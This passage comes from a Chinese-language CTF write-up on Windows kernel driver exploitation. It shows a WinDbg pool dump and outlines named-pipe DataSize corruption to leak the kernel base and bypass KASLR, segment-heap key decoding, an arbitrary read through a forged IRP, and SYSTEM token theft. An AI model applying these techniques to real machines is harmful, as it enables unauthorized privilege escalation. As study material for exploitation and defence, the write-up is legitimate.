<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>: kd&gt; dq ffff8387c055d450</span><br><span class="line">ffff8387`c055d450  <span class="number">7246704</span>e`<span class="number">0</span>a440000 <span class="number">330b</span>b4ed`<span class="number">16b</span>fc9f1</span><br><span class="line">ffff8387`c055d460  ffffc288`<span class="number">07372b</span>d8 ffffc288`<span class="number">07372b</span>d8</span><br><span class="line">ffff8387`c055d470  <span class="number">00000000</span>`<span class="number">00000000</span> ffffc288`<span class="number">05794910</span></span><br><span class="line">ffff8387`c055d480  <span class="number">00000000</span>`deadbeef <span class="number">00000000</span>`<span class="number">000003</span>d0</span><br><span class="line">ffff8387`c055d490  <span class="number">43434343</span>`<span class="number">43434343</span> <span class="number">43434343</span>`<span class="number">43434343</span></span><br><span class="line">ffff8387`c055d4a0  <span class="number">43434343</span>`<span class="number">43434343</span> <span class="number">43434343</span>`<span class="number">43434343</span></span><br><span class="line">ffff8387`c055d4b0  <span class="number">43434343</span>`<span class="number">43434343</span> <span class="number">43434343</span>`<span class="number">43434343</span></span><br><span class="line">ffff8387`c055d4c0  <span class="number">43434343</span>`<span class="number">43434343</span> <span class="number">43434343</span>`<span class="number">43434343</span></span><br></pre></td></tr></table></figure>

<p>读取pipe而且不free掉chunk，可以使用</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">PeekNamedPipe</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]            HANDLE  hNamedPipe,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out, optional] LPVOID  lpBuffer,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]            DWORD   nBufferSize,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out, optional] LPDWORD lpBytesRead,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out, optional] LPDWORD lpTotalBytesAvail,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out, optional] LPDWORD lpBytesLeftThisMessage</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>修改DataSize越界读取，泄露nt的基址，从而可以bypass kaslr</p>
<ul>
<li>Page segment &#x3D; PipeQueueEntry &amp; 0xfffffffffff00000 (Segment mask) </li>
<li>Signature of Page segment &#x3D; readmem(Page segment + 0x10) </li>
<li>Segcontext &#x3D; (Page segment) ^ (Signature of Page segment) ^ RtlpHpHeapGlobals.HeapKey ^ 0xA2E64EADA2E64EAD </li>
<li>Segment heap &#x3D; Segcontext - 0x100</li>
<li>callback function: Segment heap-&gt;VsContext，RtlpHpHeapGlobals.HeapKey ^ encode data ^ VsContext address</li>
</ul>
<p>任意地址读取：EntryType 为unbuffer时可以读取Irp，而这个Irp可以伪造</p>
<p>提权：我们可以读取system的token值，然后根据驱动的任意写写入当前进程</p>
<h3 id="API-前缀"><a href="#API-前缀" class="headerlink" title="API 前缀"></a>API 前缀</h3><p>代表着Windows native（原生）系统服务（system services）例程（routines）。  </p>
<p>Ke － kernel的缩写，代表的是内核模式的API接口。  </p>
<p>Nt － Windows New Technology的缩写，代表的是 Windows 系统服务功能API接口。 大部分以Nt开头的函数，都映射到了用户态（User Mode）API接口。比如你编写的用户模式程序，用到了CreateFile这个函数，由于它需要访问系统内部的数据结构，必须要进入内核模式，这时的程序就要转入内核模式，相对应的内核模式功能服务接口，正是ntdll.dll中的NtCreateFile，它最终完成来自用户态程序的函数功能请求。  </p>
<p>Zw － 没有具体的缩写含义，只是为了避免和其它前缀的重复。它的功能和与之相对应的Nt函数是一致的（可以说是Nt功能的镜像）。 不同点在于： 相应的Nt函数，是对系统服务的直接；而Zw需要经过一系列系统准备动作，比如：系统服务码入寄存器保存，系统KiSystemService加载，然后才执行具体的服务功能调用。 看着负担加重了，但好处是，在执行时，系统参数的系列校验不必再进行了（拜所谓的previous access mode之赐），所以反而轻快了；而Nt系列函数虽然调用时简洁，但每一次执行都要参数校验，因此反而累赘了。这也正是内核态程序（比如驱动程序）多用Zw系统的原因（因为需要和previous mode打交道）。</p>
<h3 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h3><ul>
<li><a target="_blank" rel="noopener" href="https://exploitreversing.com/2023/04/11/exploiting-reversing-er-series/">Exploiting Reversing (ER) series: article 01 – Exploit Reversing</a></li>
<li><a target="_blank" rel="noopener" href="https://exploitreversing.com/2024/01/03/exploiting-reversing-er-series-article-02/">Exploiting Reversing (ER) series: article 02 – Exploit Reversing</a></li>
<li><a target="_blank" rel="noopener" href="https://www.slideshare.net/">Share &amp; Discover Presentations</a></li>
<li><a target="_blank" rel="noopener" href="https://www.vergiliusproject.com/">windows undocumented structure: vergilius project</a></li>
<li><a target="_blank" rel="noopener" href="http://windbg.info/doc/1-common-cmds.html">Windbg command: WinDbg.info</a></li>
</ul>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a target="_blank" rel="noopener" href="https://github.com/Ha0-Y">Projects</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Driver"><span class="toc-number">1.</span> <span class="toc-text">Driver</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MDL"><span class="toc-number">1.1.</span> <span class="toc-text">MDL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#API"><span class="toc-number">1.2.</span> <span class="toc-text">API</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Debug"><span class="toc-number">1.3.</span> <span class="toc-text">Debug</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Io-NpFr-Ws2P"><span class="toc-number">1.4.</span> <span class="toc-text">Io&#x2F;NpFr&#x2F;Ws2P</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#IO"><span class="toc-number">1.4.1.</span> <span class="toc-text">IO</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Ws2P"><span class="toc-number">1.4.2.</span> <span class="toc-text">Ws2P</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CLFS"><span class="toc-number">1.5.</span> <span class="toc-text">CLFS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#More"><span class="toc-number">2.</span> <span class="toc-text">More</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7"><span class="toc-number">2.1.</span> <span class="toc-text">工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#windows-driver-reverse"><span class="toc-number">2.2.</span> <span class="toc-text">windows driver reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Devices-Symlinks"><span class="toc-number">2.2.1.</span> <span class="toc-text">Devices &amp; Symlinks</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Dispatch-Routines"><span class="toc-number">2.2.2.</span> <span class="toc-text">Dispatch Routines</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows-Kernel-HeapFengshui"><span class="toc-number">2.3.</span> <span class="toc-text">Windows Kernel HeapFengshui</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NtQuerySystemInformation"><span class="toc-number">2.4.</span> <span class="toc-text">NtQuerySystemInformation</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SystemModuleInformation"><span class="toc-number">2.4.1.</span> <span class="toc-text">SystemModuleInformation</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SystemExtendedHandleInformation"><span class="toc-number">2.4.2.</span> <span class="toc-text">SystemExtendedHandleInformation</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Scoop-the-Windows-10-pool"><span class="toc-number">2.5.</span> <span class="toc-text">Scoop the Windows 10 pool!</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#pool"><span class="toc-number">2.5.1.</span> <span class="toc-text">pool</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Segment-Backend"><span class="toc-number">2.5.1.1.</span> <span class="toc-text">Segment Backend</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Variable-Size-Backend"><span class="toc-number">2.5.1.2.</span> <span class="toc-text">Variable Size Backend</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Low-Fragmentation-Heap-Backend"><span class="toc-number">2.5.1.3.</span> <span class="toc-text">Low Fragmentation Heap Backend</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BC%93%E5%AD%98%E5%AF%B9%E9%BD%90"><span class="toc-number">2.5.1.4.</span> <span class="toc-text">缓存对齐</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Generic-Exploitation"><span class="toc-number">2.5.2.</span> <span class="toc-text">Generic Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#PipeAttribute"><span class="toc-number">2.5.2.1.</span> <span class="toc-text">PipeAttribute</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#NpFr"><span class="toc-number">2.5.2.2.</span> <span class="toc-text">NpFr</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#spray"><span class="toc-number">2.5.3.</span> <span class="toc-text">spray</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#IO-Ring"><span class="toc-number">2.5.4.</span> <span class="toc-text">IO Ring</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PreviousMode"><span class="toc-number">2.5.5.</span> <span class="toc-text">PreviousMode</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#New"><span class="toc-number">2.5.6.</span> <span class="toc-text">New</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NPFS-SYS"><span class="toc-number">2.6.</span> <span class="toc-text">NPFS.SYS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#DATA-QUEUE-ENTRY"><span class="toc-number">2.6.1.</span> <span class="toc-text">DATA_QUEUE_ENTRY</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#npfs-NpAddDataQueueEntry"><span class="toc-number">2.6.2.</span> <span class="toc-text">npfs!NpAddDataQueueEntry</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NonPagedPool-Overflow"><span class="toc-number">2.7.</span> <span class="toc-text">NonPagedPool Overflow</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%A2%E5%87%BA%E6%95%B0%E6%8D%AE%E8%B6%B3%E5%A4%9F%E5%A4%9A"><span class="toc-number">2.7.1.</span> <span class="toc-text">溢出数据足够多</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%A2%E5%87%BA%E9%95%BF%E5%BA%A6%E6%AF%94%E8%BE%83%E5%B0%8F"><span class="toc-number">2.7.2.</span> <span class="toc-text">溢出长度比较小</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#overflow-%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99"><span class="toc-number">2.7.3.</span> <span class="toc-text">overflow-&gt;任意地址写</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HITCON-2020-lucifer"><span class="toc-number">2.8.</span> <span class="toc-text">HITCON 2020 lucifer</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#API-%E5%89%8D%E7%BC%80"><span class="toc-number">2.9.</span> <span class="toc-text">API 前缀</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#reference"><span class="toc-number">2.10.</span> <span class="toc-text">reference</span></a></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ha0-y.github.io/2024/04/25/AliyunCTF-SYSTEM/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ha0-y.github.io/2024/04/25/AliyunCTF-SYSTEM/&text=AliyunCTF SYSTEM"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ha0-y.github.io/2024/04/25/AliyunCTF-SYSTEM/&title=AliyunCTF SYSTEM"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ha0-y.github.io/2024/04/25/AliyunCTF-SYSTEM/&is_video=false&description=AliyunCTF SYSTEM"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=AliyunCTF SYSTEM&body=Check out this article: https://ha0-y.github.io/2024/04/25/AliyunCTF-SYSTEM/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ha0-y.github.io/2024/04/25/AliyunCTF-SYSTEM/&title=AliyunCTF SYSTEM"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ha0-y.github.io/2024/04/25/AliyunCTF-SYSTEM/&title=AliyunCTF SYSTEM"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ha0-y.github.io/2024/04/25/AliyunCTF-SYSTEM/&title=AliyunCTF SYSTEM"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ha0-y.github.io/2024/04/25/AliyunCTF-SYSTEM/&title=AliyunCTF SYSTEM"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ha0-y.github.io/2024/04/25/AliyunCTF-SYSTEM/&name=AliyunCTF SYSTEM&description=&lt;blockquote&gt;
&lt;p&gt;Windows Driver Exploit&lt;/p&gt;
&lt;/blockquote&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ha0-y.github.io/2024/04/25/AliyunCTF-SYSTEM/&t=AliyunCTF SYSTEM"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2022-2024
    h4m5ter
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/Ha0-Y">Projects</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
